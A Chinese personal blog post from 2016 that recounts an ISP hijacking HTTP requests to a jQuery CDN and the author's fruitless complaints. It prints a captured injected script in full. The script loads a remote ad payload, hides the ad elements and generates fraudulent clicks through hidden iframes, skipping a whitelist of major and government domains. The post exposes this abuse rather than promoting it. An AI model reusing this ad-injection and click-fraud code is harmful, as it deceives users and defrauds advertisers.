---
title: 蛋疼的HTTP劫持
categories:
    - study
    - web
date: 2016-06-16 20:20:52
tags:
---

呼呼～终于做完了。易迅这 Demo 7 页搞完也真是不容易，每天都是 DIV-DIV 真是够了。HTML 结构和 CSS 反正是折腾完了，补了显眼部分的动效。后端部分偷懒没模拟,做的很粗糙，细节部分慢慢补吧。

[HTML-仿易迅商城整站](/demo/demos/HTML-仿易迅商城整站/)

<!--more-->

做完感觉 CSS 还是太乱，除了显眼的头尾、及个别窗体，重用部分还是不够。主要是写结构的时候没全局的感觉，不能一眼看完效果图就知道哪哪哪可重用，然后为后面 Class 埋伏笔。我现在对 CSS 的感觉就像小学生写字，一笔一画往下写，虽然能写完但不漂亮，是不是该找个 CSS 框架。短期来看还是站巨人肩头长得高。 SCSS 好像不错。

还要喷下铁通，尼玛我本地写代码都有广告……我只引用了百度的 JQUERY 库而已。例如我写个空白 HTML ,仅引入百度 Jquery 。

```vbscript-html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Document</title>
</head>
<body>
     <script src="http://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
</body>
</html>
```

后然……

![Jquer劫持](jc1.jpg)

![Jquer劫持](jc2.jpg)

可以明显看到 Jquery 被 HTTP 劫持 302 跳转到移动服务器，然后一大波 JS ，DOM 中 IFRAME 引入了广告。

其中有个 JS 拆开很有意思：

> http://g.gclick.cn/static/dice-pc.js

```javascript
!(function () {
    var b,
        c,
        d,
        e,
        f,
        g,
        h,
        i,
        j,
        k,
        l,
        m,
        n,
        o,
        p,
        a = "dice-pc";
    if (
        (window._GRD && window._GRD.triggerStats && window._GRD.triggerStats(a),
        !Math.DICE)
    ) {
        if (
            ((Math.DICE = !0),
            (b =
                /baidu.com|taobao.com|qq.com|360.cn|sogou.com|www.apple.com|cntv.cn|1360.com|hao123.com|12306.cn|icbc.com.cn|duba.com|10086.cn|google.com.hk|google.com|bing.com|chinaz.com|duba.net|gdltax.gov.cn|alibaba.com|qihoo.com|xiaomi.com|google.cn|bjjtgl.gov.cn|moe.edu.cn|moe.gov.cn|www.mof.gov.cn|www.mohurd.gov.cn|cq.gov.cn|www.sipo.gov.cn|www.sda.gov.cn|jl.gov.cn|www.sdpc.gov.cn|www.saic.gov.cn|www.beijing.gov.cn|www.customs.gov.cn|hainan.gov.cn|jiangxi.gov.cn|www.fmprc.gov.cn|www.mohrss.gov.cn|www.aqsiq.gov.cn|bjjtgl.gov.cn|www.cbrc.gov.cn|mofcom.gov.cn|www.szaic.gov.cn|www.mod.gov.cn|www.sc.gov.cn|www.csrc.gov.cn|www.forestry.gov.cn|e21.cn|www.nmg.gov.cn|www.fujian.gov.cn|www.shanxigov.cn|www.shaanxi.gov.cn|ccn.mofcom.gov.cn|taiwan.net.tw|www.jiangsu.gov.cn|www.gd.gov.cn|www.gansu.gov.cn|www.hunan.gov.cn|www.qh.gov.cn|jxedu.gov.cn|www.hlj.gov.cn|www.hebei.gov.cn|www.gzgov.gov.cn|www.chengdu.gov.cn|bjrbj.gov.cn|www.nx.gov.cn|yw.gov.cn|haaic.gov.cn|gxeea.cn|sbj.saic.gov.cn|cnnic.cn|jxhld.gov.cn|court.gov.cn|www.chinagrain.gov.cn|cas.cn|changzhi.gov.cn|ly.gov.cn|huzhou.gov.cn|www.shandong.gov.cn|www.changsha.gov.cn|www.fuzhou.gov.cn|www.wenzhou.gov.cn|www.mlnews.gov.cn|www.xm.gov.cn|foshan.gov.cn|www.mas.gov.cn|ahxf.gov.cn|npc.gov.cn|hongze.gov.cn|linfen.gov.cn|www.changde.gov.cn|yn.gov.cn|qyxy.baic.gov.cn|xf.gov.cn|www.xiangxiang.gov.cn|hebwst.gov.cn|dg.gov.cn|www.zhenjiang.gov.cn|smesd.gov.cn|l.gov.cn|www.bjchy.gov.cn|maoming.gov.cn|linyi.gov.cn|moc.gov.cn|gwytb.gov.cn|www.huangshan.gov.cn|ccgp.gov.cn|mps.gov.cn|www.pingliang.gov.cn|henan.gov.cn|www.taizhou.gov.com/),
            (c = "01b1f6566fbc77663f16"),
            (d = "2d724824dd45d5c89b25"),
            (e = 0),
            (f = function (a) {
                (window.DICELOGS = window.DICELOGS || []),
                    window.DICELOGS.push(a);
            }),
            location.hostname.match(b))
        )
            return f("* Good boy.");
        (g = function () {
            e > 1 ||
                (e++,
                (function () {
                    var a;
                    return document.body
                        ? ((a = document.createElement("script")),
                          (a.type = "text/javascript"),
                          (a.text = '_guanggao_pub= "' + c + '";'),
                          (a.text += '_guanggao_slot= "' + d + '";'),
                          document.body.insertBefore(
                              a,
                              document.body.children.item(0)
                          ),
                          (a = document.createElement("script")),
                          (a.src =
                              "http://ssp.thescenseproject.com/js/01b1f6566fbc77663f16"),
                          (a.type = "text/javascript"),
                          document.body.insertBefore(
                              a,
                              document.body.children.item(0)
                          ),
                          void 0)
                        : setTimeout(arguments.callee, 50);
                })());
        }),
            (h = function (a, b) {
                return (
                    Math.random() * (Math.max(a, b) - Math.min(a, b)) +
                    Math.min(a, b)
                );
            }),
            (i = function () {
                return h(1, 50);
            }),
            (j = function (a) {
                var b = 0,
                    c = 0,
                    d = 0.0125 * a + 0.375;
                return (
                    a > 10 && Math.random() < d
                        ? ((c = h(2, 10)), (b = c * h(1, 5 / c)))
                        : (b = a),
                    b
                );
            }),
            (k =
                /http:\/\/ssp\.thescenseproject\.com\/clk2\.html\?q\=[0-9a-zA-Z]+/g),
            (l = !1),
            (m = 0),
            (n = function (b) {
                var d,
                    e,
                    g,
                    c = 0.02;
                return (
                    f("* Click rate: <" + c + ">."),
                    Math.random() > c
                        ? f("* Click ignore.")
                        : ((d = document.createElement("iframe")),
                          (e = 1e3 * j(i())),
                          (g = function () {
                              document.body.appendChild(d),
                                  window._GRD &&
                                      window._GRD.triggerEventStats &&
                                      window._GRD.triggerEventStats(a, "click");
                          }),
                          (d.style.display = "none"),
                          d.setAttribute("src", b),
                          setTimeout(g, e),
                          f("* Clicked."),
                          void 0)
                );
            }),
            (document.body._insertBefore = document.body.insertBefore),
            (document.body.insertBefore = function (a, b) {
                return (
                    "DIV" === a.tagName &&
                        0 === a.id.indexOf(c + "_" + d) &&
                        ((a.style.height = "0px"),
                        (a.style.visibility = "hidden")),
                    document.body._insertBefore(a, b)
                );
            }),
            (o = 0),
            (p = setInterval(function () {
                var b, c, e, h, i, j;
                if (!h) {
                    if (o >= 5) return (o = 0), void 0;
                    for (
                        0 === o && (f("* Call origin script."), g()),
                            o++,
                            b = document.getElementsByTagName("iframe"),
                            i = b.length;
                        i--;

                    )
                        if (
                            ((e = b[i].attributes),
                            (iframeParent = b[i].parentNode),
                            iframeParent &&
                                iframeParent.id &&
                                iframeParent.id.indexOf(d) > 0)
                        )
                            for (j = e.length; j--; )
                                "data-srcdoc" === e[j].nodeName &&
                                    (f("* Dice click url found."),
                                    (c = b[i]),
                                    (h = (
                                        e[j].value ||
                                        e[j].nodeValue ||
                                        e[j].textContent
                                    ).toString()));
                    try {
                        (l = h ? h.match(k) : []), (m = l.length);
                    } catch (q) {}
                    m &&
                        (clearInterval(p),
                        (l = l[parseInt(Math.random() * m)]),
                        n(l),
                        (c.parentNode.style.display = "none"),
                        window._GRD &&
                            window._GRD.triggerEventStats &&
                            window._GRD.triggerEventStats(a, "view"));
                }
            }, 500));
    }
})();
```

第三行可以很明显看到有 113 条白名单，刨去 85 个 GOV 域名的 government 。

> /baidu.com | taobao.com | qq.com | 360.cn | sogou.com | www.apple.com | cntv.cn | 1360.com | hao123.com | 12306.cn | icbc.com.cn | duba.com | 10086.cn | google.com.hk | google.com | bing.com | chinaz.com | duba.net | alibaba.com | qihoo.com | xiaomi.com | google.cn | moe.edu.cn |

再联合到之前的新闻，果然会哭的孩子有奶吃。

> [腾讯、小米、360 等 “六国联军” 结盟抵制 “流量劫持”](http://www.huxiu.com/article/135293/1.html)

其实当年的铁通还可以，直到去年中期，不知道是不是和移动合并的缘故，开始封 UDP、PPTP 端口、插广告，微信随便打开链接直接跳转到 “添加营销号” 页。这样劫持你敢信……而且网络也各种 NAT，虽然给的是公网 IP，但是本地的电信都不能互访。还要绕海外的 VPS 来访问自家的路由也是醉了。

打电话举报，尼玛 10050 的铁通电话被告知与移动合并，又转去 10086.（其实我很好奇联通打 10086 要扣费不?）果然跟客服妹纸扯不清，只让她记录上报。第二天一早还没起床，铁通运维的就来了，满口自信说铁通不可能劫持，一定是我电脑的问题。来了俩，当场演示，虽然他们不懂，但是我把白名单列出，里面有 10086.cn 这总看得懂吧。又一通电话召唤了个"懂技术”的，依然是坑，满口不在乎，看完演示直接走了，边走边说没劫持是不可能的……让拍了照继续上报。

我也知道这劫持肯定不是本地 ISP 就能解决的，一是没这么大权限，二是运维的一般也不懂。果然下午铁通机房的打电话来了，当然也是运维的，我说的 HTTP 劫持也不甚了解。只说明了不是他们本地劫持的，只能帮我往上报，至于能不能解决他们也没有办法，希望我能理解。然后让我提交一些图片证明。我本是加他 QQ 然后远程桌面演示的，结果巧的是劫持这时候没有了……我踩那位 “劫持者” 也是高层了，应该有监控后台工单，看到有投诉就默默取消了，反而下面不知道。不过仅仅是百度的劫持没有了，京东百度等返利的还在。但是那些证据就不好抓了，至少没有广告这个这么明显。只得作罢。走后过了会儿，运维的打电话来表示希望我能先结束工单，超期了他要扣钱，不过这个会继续往上面报。想想就同意了，毕竟也不是他们的锅。再后来就是移动以及本地的客服回访了，监督倒是不少，可不能解决问题有什么用呢……

这 3 ～ 4 天来看，百度 CDN 库的劫持倒是没有了，其他还在，想想还是算了，大不了明年换电信了，要不是看在这外网质量高早就不忍了，现在和我 VPS 不管早晚高峰稳定 50ms。速度能跑满我多拨的 100M ～相反电信却一直找不到合适的线路，HK + CN2 + 大水管 符合的几乎都是天价，流量都是 1R/G。这哪买得起……而且电信晚上那出口带宽，真是堪忧。

唉，蛋疼的网络……
